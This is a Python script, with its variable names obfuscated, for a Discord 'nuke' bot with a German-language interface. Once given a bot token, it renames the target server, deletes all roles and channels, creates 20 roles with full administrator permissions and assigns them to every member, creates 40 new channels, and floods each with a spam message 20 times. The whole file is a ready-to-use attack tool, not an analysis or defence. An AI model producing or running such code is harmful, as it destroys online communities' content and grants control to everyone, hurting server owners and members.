import discord #line:1
from discord .ext import commands #line:2
import asyncio #line:3
import time #line:4
def get_input (O0000O000OO0O0O0O ):#line:7
    return input (f"{O0000O000OO0O0O0O}: ")#line:8
green ="\033[32m"#line:11
red ="\033[31m"#line:12
orange ="\033[38;5;214m"#line:13
reset ="\033[0m"#line:14
def print_logo ():#line:17
    print (f"""{green}
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ░██████╗███████╗██████╗░██╗░░░██╗███████╗██████╗░  
████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔════╝██╔════╝██╔══██╗██║░░░██║██╔════╝██╔══██╗  
██╔██╗██║██║░░░██║█████═╝░█████╗░░  ╚█████╗░█████╗░░██████╔╝╚██╗░██╔╝█████╗░░██████╔╝  
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ░╚═══██╗██╔══╝░░██╔══██╗░╚████╔╝░██╔══╝░░██╔══██╗  
██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╔╝███████╗██║░░██║░░╚██╔╝░░███████╗██║░░██║  
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝  
{reset}""")#line:25
def ask_for_inputs ():#line:28
    OOOO000O0OO000000 =get_input ("Gib den Bot-Token ein")#line:29
    OO0OOO0O000O0000O =get_input ("Neuer Servername")#line:30
    O0OOOO0OOO000O0O0 =get_input ("Neuer Kanalname")#line:31
    O0O0O0O0OOO00O0OO =get_input ("Spam-Nachricht")#line:32
    O0O000OO000OOOOOO =get_input ("Rollenname (Komma getrennt)").split (",")#line:33
    return OOOO000O0OO000000 ,OO0OOO0O000O0000O ,O0OOOO0OOO000O0O0 ,O0O0O0O0OOO00O0OO ,O0O000OO000OOOOOO #line:34
def show_logo_and_clear ():#line:37
    print_logo ()#line:38
    time .sleep (3 )#line:39
    print ("\033c",end ="")#line:40
def ask_for_confirmation ():#line:43
    OOO0OOOO00000OOO0 =get_input ("Bist du sicher, dass du fortfahren möchtest? (j/n)")#line:44
    if OOO0OOOO00000OOO0 .lower ()!="j":#line:45
        print ("Abbruch...")#line:46
        exit ()#line:47
show_logo_and_clear ()#line:50
print (f"{red}\n\nMade by Fynn\n"+"="*30 )#line:53
print ("Bugs report Discord: https://discord.gg/wYbNY8eBYn")#line:54
print ("="*30 )#line:55
TOKEN ,GUILD_NAME ,NEW_CHANNEL_NAME ,MESSAGE_CONTENT ,ROLE_NAMES =ask_for_inputs ()#line:58
ask_for_confirmation ()#line:61
print (f"{orange}Bot startet... Bitte warten...{reset}")#line:64
intents =discord .Intents .all ()#line:67
bot =commands .Bot (command_prefix ="!",intents =intents ,help_command =None )#line:68
@bot .event #line:71
async def on_ready ():#line:72
    print (f"Bot ist eingeloggt als {bot.user}")#line:73
    print ("Gib in den Chat ein: !n um den Nuke zu starten")#line:74
@bot .command ()#line:77
async def n (OO0OOO00OO0O00OO0 ):#line:78
    O0O0O000O000O00OO =OO0OOO00OO0O00OO0 .guild #line:79
    print (f"Spam-Befehl wurde von {OO0OOO00OO0O00OO0.author} auf {O0O0O000O000O00OO.name} ausgeführt.")#line:80
    try :#line:83
        await O0O0O000O000O00OO .edit (name =GUILD_NAME )#line:84
        print (f"Server-Name geändert zu: {GUILD_NAME}")#line:85
    except Exception as O0OOOO00O00O000O0 :#line:86
        print (f"Fehler beim Ändern des Server-Namens: {O0OOOO00O00O000O0}")#line:87
    print ("Lösche alle Rollen...")#line:90
    for O0000O000O0OOO0OO in O0O0O000O000O00OO .roles :#line:91
        if O0000O000O0OOO0OO .name !="@everyone":#line:92
            try :#line:93
                await O0000O000O0OOO0OO .delete ()#line:94
                print (f"Rolle {O0000O000O0OOO0OO.name} gelöscht.")#line:95
            except Exception as O0OOOO00O00O000O0 :#line:96
                print (f"Fehler beim Löschen der Rolle {O0000O000O0OOO0OO.name}: {O0OOOO00O00O000O0}")#line:97
    print ("Lösche alle Kanäle...")#line:100
    await asyncio .gather (*(OOO000OO0O0O00000 .delete ()for OOO000OO0O0O00000 in O0O0O000O000O00OO .channels ))#line:101
    print ("Alle Kanäle wurden gelöscht.")#line:102
    print ("Erstelle neue Rollen...")#line:105
    OOO0OO0O0000OO00O =await asyncio .gather (*(O0O0O000O000O00OO .create_role (name =f"{NEW_CHANNEL_NAME} Role {O000O00O0O00O000O+1}",permissions =discord .Permissions .all ())for O000O00O0O00O000O in range (20 )))#line:108
    print (f"Es wurden {len(OOO0OO0O0000OO00O)} neue Rollen erstellt.")#line:109
    print ("Weise Rollen zu...")#line:112
    await asyncio .gather (*(OOOO00000OO00O000 .add_roles (*OOO0OO0O0000OO00O )for OOOO00000OO00O000 in O0O0O000O000O00OO .members ))#line:115
    print ("Alle Rollen wurden zugewiesen.")#line:116
    print ("Erstelle neue Kanäle...")#line:119
    O0O0OO0OO0O0OO0O0 =await asyncio .gather (*(O0O0O000O000O00OO .create_text_channel (f"{NEW_CHANNEL_NAME}-{O00OO0OOO000OO00O+1}")for O00OO0OOO000OO00O in range (40 )))#line:122
    print (f"Es wurden {len(O0O0OO0OO0O0OO0O0)} neue Kanäle erstellt.")#line:123
    print ("Sende Nachrichten in den Kanälen...")#line:126
    await asyncio .gather (*(O0O000OOO0OOOO000 .send (MESSAGE_CONTENT )for O0O000OOO0OOOO000 in O0O0OO0OO0O0OO0O0 for _O0OOO0000OO0OOOOO in range (20 )))#line:129
    print ("Nachrichten wurden in allen Kanälen gesendet.")#line:130
bot .run (TOKEN )#line:133
